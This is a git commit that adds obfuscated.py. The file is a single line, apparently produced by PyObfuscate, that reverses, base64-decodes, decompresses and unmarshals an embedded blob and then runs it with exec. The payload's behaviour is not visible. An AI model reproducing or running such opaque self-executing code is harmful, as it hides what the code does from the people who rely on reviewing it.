2a024b9074a8abe4487fe292a5bf47cb40418eed
6nz <74118308+6nz@users.noreply.github.com>
2022-10-24 00:00:36 +0200

    Create obfuscated.py

---
+++ obfuscated.py
@@ -0,0 +1,5 @@
+# Obfuscated with PyObfuscate
+# https://www.github.com/htr-tech
+# Time : Fri Oct 21 16:14:46 2022
+# -------------------------------
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=oFE/yHAD8AFkhBqI1hqOlmS+5WTHah7Cba2LGPMiAqRiYoSJ7lZRF0aWE/kPRMO1QcJKmykBhZMFGSkRmZoFGSliAEPFTMAsDETDAkZLxJe'))
